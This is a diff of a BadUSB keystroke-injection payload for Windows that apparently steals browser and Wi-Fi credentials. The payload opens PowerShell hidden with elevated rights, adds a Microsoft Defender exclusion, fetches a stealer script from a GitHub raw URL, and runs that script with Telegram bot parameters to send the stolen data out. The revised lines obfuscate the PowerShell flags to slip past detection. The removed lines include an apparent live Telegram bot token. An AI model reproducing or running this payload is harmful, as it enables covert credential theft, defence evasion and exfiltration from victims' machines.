@@ -14,16 +14,32 @@ REM # Category : Data Exfiltration, Credential Dumping        #
 REM # Target   : Windows 10/11                                #
 REM #                                                         #
 REM # Description:                                            #
-REM # - Launches PowerShell in hidden mode                    #
-REM # - Extracts browser passwords and WiFi credentials       #
-REM # - Saves them as .txt files                              #
-REM # - Exfiltrates the data via Telegram                     #
-REM # - Cleans up traces after execution                      #
+REM # - Launches PowerShell in a hidden window                 #
+REM # - Collects browser credentials and browsing history      #
+REM # - Collects Wi-Fi credentials and network device data     #
+REM # - Packages the collected text files into a ZIP archive   #
+REM # - Sends the ZIP archive through Telegram                 #
+REM # - Removes its files and Microsoft Defender exclusions    #
 REM #                                                         #
 REM ###########################################################
 
-REM Initial delay to ensure the system is ready
-DELAY 2500
+REM Minimize all active windows
+GUI d
+DELAY 500
+
+REM Open Run dialog
+GUI r
+DELAY 500
+
+REM Use Winget to install PowerShell 7 for the following commands
+STRING powershell -"w" h -NopR -e"P" By"pa"ss -cOMMa "winget install --id Microsoft.PowerShell --source winget"
+CTRL-SHIFT ENTER
+DELAY 1000
+LEFT
+DELAY 500
+ENTER
+
+DELAY 15000
 
 REM Minimize all active windows
 GUI d
@@ -33,8 +49,8 @@ REM Open Run dialog
 GUI r
 DELAY 500
 
-REM Execute PowerShell hidden with administrative privileges
-STRING powershell -w h -NoP -Ep Bypass -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents'; iwr 'https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/refs/heads/main/ps.ps1' -O 'C:\Users\Public\Documents\ps.ps1'"
+REM Exclude Public Documents from Microsoft Defender scanning, then download the PowerShell script
+STRING pwsh -"w" h -NopR -e"P" By"pa"ss -cOMMa "Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents'; iwr 'https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/refs/heads/main/ps.ps1' -OutFile 'C:\Users\Public\Documents\ps.ps1'"
 CTRL-SHIFT ENTER
 DELAY 1000
 LEFT
@@ -51,15 +67,15 @@ REM Open Run dialog
 GUI r
 DELAY 500
 
-REM Execute PowerShell hidden with administrative privileges
-STRING powershell -w h -NoP -Ep Bypass -Command "& 'C:\Users\Public\Documents\ps.ps1' -Token '6659995323:AAFNA_LCQ229saLyMhV-Ptbqx8pPrWDM5fk' -ChatID '749758516'"
+REM Execute the downloaded PowerShell script with administrator privileges
+STRING pwsh -"w" h -NopR -e"P" By"pa"ss -cOMMa "& 'C:\Users\Public\Documents\ps.ps1' -Token 'TOKEN' -ChatID 'CHATID'"
 CTRL-SHIFT ENTER
 DELAY 1000
 LEFT
 DELAY 500
 ENTER
 
-REM Flash CAPSLOCK as an indicator that execution is complete
+REM Flash CAPS LOCK to indicate that the PowerShell script was launched
 CAPSLOCK
 DELAY 500
 CAPSLOCK
